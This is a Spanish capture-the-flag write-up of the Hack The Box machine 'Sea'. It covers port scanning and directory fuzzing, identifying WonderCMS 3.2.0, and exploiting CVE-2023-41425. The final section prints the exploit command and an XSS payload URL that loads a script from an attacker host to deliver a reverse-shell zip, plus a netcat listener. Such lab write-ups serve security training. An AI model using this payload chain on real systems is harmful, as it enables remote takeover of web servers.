---
title: Sea - Hack The Box
date: 2024-12-02
description: Maquina Sea (Easy) de Hack The Box.
categories:
    - Writeups
    - HTB
tags:
    - Linux
    - HTB
    - CTF
    - Easy
    - Seasonal
media_subpath: /assets/img/commons/sea/
image: sea.png
---

## Escaneo

```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.10.11.28 -oG allPorts
```

Puertos abiertos: 22 y 80

## Análisis

```bash
nmap -sCV -p22,80 10.10.11.23 -oN targeted

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

El puerto 80 da acceso a la web de http://sea.htb, sin nada destacable.

Whatweb tampoco añade mayor información:
```bash
whatweb http://sea.htb

http://sea.htb [200 OK] Apache[2.4.41], Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.28], JQuery[1.12.4], Script, Title[Sea - Home], X-UA-Compatible[IE=edge]
```

Enumerando con nmap se ven los siguientes directorios sin información relevante:
```bash
nmap --script http-enum -p80 10.10.11.28 -oN webScan
80/tcp open  http
| http-enum: 
|_  /home/: Potentially interesting folder
```

Enumerando directorios con wfuzz se ven los siguientes directorios:
```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000182:   301        7 L      20 W       228 Ch      "data"                                                                                         
000000519:   301        7 L      20 W       231 Ch      "plugins"                                                                                      
000000955:   301        7 L      20 W       232 Ch      "messages"                                                                                     
000000124:   200        86 L     262 W      3649 Ch     "0"                                                                                            
000000127:   301        7 L      20 W       230 Ch      "themes"                                                                                        
000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         

```

Directorio /data:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/data/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000001559:   200        84 L     209 W      3340 Ch     "404"                                                                                          
000000094:   301        7 L      20 W       234 Ch      "files"                                                                                        
000000038:   200        86 L     262 W      3649 Ch     "home"    
```

Directorio /data/files:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/data/files/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000001559:   200        84 L     209 W      3340 Ch     "404"   
```

Directorio /plugins:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/plugins/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000001559:   200        84 L     209 W      3340 Ch     "404"   
```

Directorio /messages:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/messages/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000001559:   200        84 L     209 W      3340 Ch     "404"     
```

Directorio /themes:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/themes/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000001559:   200        84 L     209 W      3340 Ch     "404"                                                                                          
000007875:   301        7 L      20 W       235 Ch      "bike"  
```

Directorio /themes/bike:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/themes/bike/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000252:   200        1 L      1 W        6 Ch        "version"                                                                                      
000000039:   301        7 L      20 W       239 Ch      "img"                                                                                          
000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000000550:   301        7 L      20 W       239 Ch      "css"                                                                                          
000000965:   200        1 L      9 W        66 Ch       "summary"                                                                                      
000001559:   200        84 L     209 W      3340 Ch     "404"                                                                                          
000003295:   200        21 L     168 W      1067 Ch     "LICENSE"   
```

El directorio "http://sea.htb/themes/bike/version" muestra la versión "3.2.0" de un sistema.

El directorio "http://sea.htb/themes/bike/LICENSE" muestra la MIT License de "turboblack".

Una busqueda de "turboblack" y el theme "bike", devuelve el CMS ["Wonder"](https://github.com/turboblack/wondercms_theme).

Buscando por vulnerabilidades para Wonder CMS en versión 3.2.0 devuelve el [CVE-2023-41425](https://github.com/insomnia-jacob/CVE-2023-41425).


## Explotación

El exploit utiliza XSS para lanzar una RCE. Al ejecutar el exploit, este genera un servidor web que se queda a la escucha del puerto 8000 y entregará a la maquina victima el fichero "main.zip" que contiene la reverse shell.

En los parametros del exploit se pasa el puerto donde se dejará a la escucha netcat (443):

```bash
./exploit.py -u http://sea.htb/loginURL -i 10.10.14.160 -p 443 -r http://10.10.14.160:8000/main.zip
 
================================================================
        # Autor      : Insomnia (Jacob S.)
        # IG         : insomnia.py
        # X          : @insomniadev_
        # Github     : https://github.com/insomnia-jacob
================================================================          
 
[+]The zip file will be downloaded from the host:    http://10.10.14.160:8000/main.zip
 
[+] File created:  xss.js
 
[+] Set up nc to listen on your terminal for the reverse shell
	Use:
		  nc -nvlp 443 
 
[+] Send the below link to admin:

	http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.160:8000/xss.js"></script><form+action=" 

Starting HTTP server with Python3, waiting for the XSS request
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
